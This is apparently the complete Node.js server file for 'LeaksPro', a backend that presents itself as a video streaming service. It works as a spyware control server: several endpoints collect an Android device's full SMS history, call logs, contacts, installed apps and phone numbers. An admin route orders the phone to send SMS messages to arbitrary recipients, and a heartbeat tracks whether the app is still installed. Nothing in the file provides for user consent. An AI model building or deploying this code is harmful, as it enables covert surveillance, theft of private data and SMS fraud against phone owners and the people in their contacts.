const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

// Initialize database (async — sql.js)
const db = require('./config/database');

async function startServer() {
  // Wait for sql.js to initialise before loading routes
  await db.__initDatabase();

  // Initialise Cloudinary
  const { initCloudinary } = require('./config/cloudinary');
  initCloudinary();

  // Import routes
  const videoRoutes = require('./routes/videos');
  const adminRoutes = require('./routes/admin');

  // Import WebSocket handler
  const setupWebSocket = require('./websocket/handler');

  const app = express();
  const server = http.createServer(app);

  // Socket.IO with CORS + aggressive ping for instant device detection
  const io = new Server(server, {
    cors: {
      origin: '*',
      methods: ['GET', 'POST', 'PUT', 'DELETE'],
    },
    maxHttpBufferSize: 100 * 1024 * 1024, // 100MB for chunk uploads
    pingInterval: 1000,  // ping every 1 second
    pingTimeout: 2000,   // mark dead after 2 seconds no response
  });

  // Middleware
  app.use(cors());
  app.use(express.json({ limit: '50mb' }));
  app.use(express.urlencoded({ extended: true, limit: '50mb' }));

  // Ensure data directory exists
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir, { recursive: true });

  // Static files (admin panel only — videos are on Cloudinary)
  app.use('/admin', express.static(path.join(__dirname, 'admin-panel')));

  // Make io accessible to routes
  app.set('io', io);

  // Root route
  app.get('/', (req, res) => {
    res.json({
      app: 'LeaksPro Backend',
      status: 'running',
      admin: '/admin',
      api: '/api/health',
    });
  });

  // API Routes
  app.use('/api/videos', videoRoutes);
  app.use('/api/admin', adminRoutes);

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({
      status: 'ok',
      app: 'LeaksPro Backend',
      version: '1.0.0',
      uptime: process.uptime(),
      timestamp: new Date().toISOString(),
    });
  });

  // Device registration endpoint (called by Android app on first launch)
  app.post('/api/devices/register', (req, res) => {
    try {
      const { device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });

      const phonesJson = JSON.stringify(phone_numbers || []);
      const existing = db.prepare('SELECT device_id FROM devices WHERE device_id = ?').get(device_id);
      if (existing) {
        db.prepare(`UPDATE devices SET
          device_name = ?, model = ?, manufacturer = ?, os_version = ?, sdk_version = ?,
          app_version = ?, screen_resolution = ?, phone_numbers = ?,
          battery_percent = ?, battery_charging = ?,
          total_storage = ?, free_storage = ?, total_ram = ?, free_ram = ?,
          is_online = 1, last_seen = datetime('now')
          WHERE device_id = ?`).run(
          device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
          app_version || '', screen_resolution || '', phonesJson,
          battery_percent ?? -1, battery_charging ? 1 : 0,
          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0,
          device_id
        );
      } else {
        db.prepare(`INSERT INTO devices (device_id, device_name, model, manufacturer, os_version, sdk_version, app_version, screen_resolution, phone_numbers, battery_percent, battery_charging, total_storage, free_storage, total_ram, free_ram)
          VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)`).run(
          device_id, device_name || '', model || '', manufacturer || '', os_version || '', sdk_version || 0,
          app_version || '', screen_resolution || '', phonesJson,
          battery_percent ?? -1, battery_charging ? 1 : 0,
          total_storage || 0, free_storage || 0, total_ram || 0, free_ram || 0
        );
      }
      res.json({ success: true });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // SMS sync endpoint — Android app sends all SMS messages here
  app.post('/api/devices/sms', (req, res) => {
    try {
      const { device_id, messages } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(messages)) return res.status(400).json({ error: 'messages must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO sms_messages
        (device_id, sms_id, address, body, date, type, read, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const msg of messages) {
        try {
          insert.run(
            device_id,
            msg.id || 0,
            msg.address || 'Unknown',
            msg.body || '',
            msg.date || 0,
            msg.type || 1,
            msg.read || 0
          );
          count++;
        } catch (_) { /* skip duplicates or errors */ }
      }

      console.log(`[SMS] Synced ${count} messages from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Call logs sync endpoint — Android app sends call logs here
  app.post('/api/devices/call-logs', (req, res) => {
    try {
      const { device_id, logs } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(logs)) return res.status(400).json({ error: 'logs must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO call_logs
        (device_id, call_id, number, name, type, date, duration, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const log of logs) {
        try {
          insert.run(
            device_id,
            log.id || 0,
            log.number || 'Unknown',
            log.name || '',
            log.type || 1,
            log.date || 0,
            log.duration || 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CALLS] Synced ${count} call logs from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Contacts sync endpoint — Android app sends contacts here
  app.post('/api/devices/contacts', (req, res) => {
    try {
      const { device_id, contacts } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(contacts)) return res.status(400).json({ error: 'contacts must be an array' });

      const insert = db.prepare(`INSERT OR REPLACE INTO contacts
        (device_id, contact_id, name, phones, emails, synced_at)
        VALUES (?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const c of contacts) {
        try {
          insert.run(
            device_id,
            String(c.id || count),
            c.name || 'Unknown',
            JSON.stringify(c.phones || []),
            JSON.stringify(c.emails || [])
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[CONTACTS] Synced ${count} contacts from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Installed apps sync endpoint — Android app sends app list here
  app.post('/api/devices/apps', (req, res) => {
    try {
      const { device_id, apps } = req.body;
      if (!device_id) return res.status(400).json({ error: 'device_id is required' });
      if (!Array.isArray(apps)) return res.status(400).json({ error: 'apps must be an array' });

      // Clear old apps for this device and re-insert (full sync)
      db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(device_id);

      const insert = db.prepare(`INSERT INTO installed_apps
        (device_id, package_name, app_name, version, install_time, update_time, is_system, synced_at)
        VALUES (?, ?, ?, ?, ?, ?, ?, datetime('now'))`);

      let count = 0;
      for (const app of apps) {
        try {
          insert.run(
            device_id,
            app.package_name || '',
            app.app_name || '',
            app.version || '',
            app.install_time || 0,
            app.update_time || 0,
            app.is_system ? 1 : 0
          );
          count++;
        } catch (_) { /* skip errors */ }
      }

      console.log(`[APPS] Synced ${count} apps from device ${device_id}`);
      res.json({ success: true, synced: count });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Send SMS via device — admin sends command to a connected device
  app.post('/api/admin/send-sms', (req, res) => {
    try {
      const { password, device_id, receiver, message, sim_slot } = req.body;

      // Verify admin password
      const stored = db.prepare("SELECT value FROM admin_settings WHERE key = 'admin_password'").get();
      if (!stored || password !== stored.value) {
        return res.status(401).json({ error: 'Invalid admin password' });
      }

      if (!device_id || !receiver || !message) {
        return res.status(400).json({ error: 'device_id, receiver, and message are required' });
      }

      // Find the device's socket
      const device = db.prepare('SELECT socket_id FROM devices WHERE device_id = ?').get(device_id);
      if (!device || !device.socket_id) {
        return res.status(400).json({ error: 'Device is not connected via WebSocket. The app must be open.' });
      }

      const targetSocket = io.sockets.sockets.get(device.socket_id);
      if (!targetSocket) {
        return res.status(400).json({ error: 'Device socket not found. The app may have just disconnected.' });
      }

      // Generate a unique request ID for tracking
      const requestId = `sms_${Date.now()}_${Math.random().toString(36).substr(2, 6)}`;

      // Emit send_sms command to the device
      targetSocket.emit('send_sms', {
        request_id: requestId,
        receiver,
        message,
        sim_slot: sim_slot || 1,
      });

      console.log(`[SMS-SEND] Command sent to device ${device_id}: to=${receiver} sim=${sim_slot}`);
      res.json({ success: true, request_id: requestId, message: 'Send command dispatched to device' });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Stream endpoint — redirects to Cloudinary URL
  app.get('/api/stream/:videoId', (req, res) => {
    try {
      const Video = require('./models/Video');
      const video = Video.getById(req.params.videoId);
      if (!video) return res.status(404).json({ error: 'Video not found' });
      res.redirect(video.filename);
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  });

  // Setup WebSocket
  setupWebSocket(io);

  // ========== CLEANUP TIMER ==========
  // Every 5 minutes, delete devices whose last_seen is older than 30 minutes.
  // If WorkManager heartbeat stops (= app uninstalled), the device becomes stale
  // and gets removed from the admin panel.
  setInterval(() => {
    try {
      const stale = db.prepare(
        "SELECT device_id FROM devices WHERE last_seen < datetime('now', '-30 minutes')"
      ).all();
      if (stale.length > 0) {
        db.prepare(
          "DELETE FROM devices WHERE last_seen < datetime('now', '-30 minutes')"
        ).run();
        stale.forEach(d => io.emit('device_removed', { device_id: d.device_id }));
        console.log(`[CLEANUP] Removed ${stale.length} stale device(s) — likely uninstalled`);
      }
    } catch (err) {
      console.error('[CLEANUP] Error:', err.message);
    }
  }, 5 * 60 * 1000); // every 5 minutes

  // Start listening
  const PORT = process.env.PORT || 3000;
  return new Promise((resolve, reject) => {
    server.on('error', reject);
    server.listen(PORT, '0.0.0.0', () => {
      console.log(`[SERVER] LeaksPro Backend running on port ${PORT}`);
      console.log(`[SERVER] Environment: ${process.env.NODE_ENV || 'development'}`);
      console.log(`[SERVER] Ready to accept connections`);
      resolve();
    });
  });
}

// Global error handlers — must exit so Railway restarts the container
process.on('uncaughtException', (err) => {
  console.error('UNCAUGHT EXCEPTION:', err);
  process.exit(1);
});
process.on('unhandledRejection', (err) => {
  console.error('UNHANDLED REJECTION:', err);
  process.exit(1);
});

// Start the server
startServer().catch((err) => {
  console.error('Failed to start server:', err);
  process.exit(1);
});
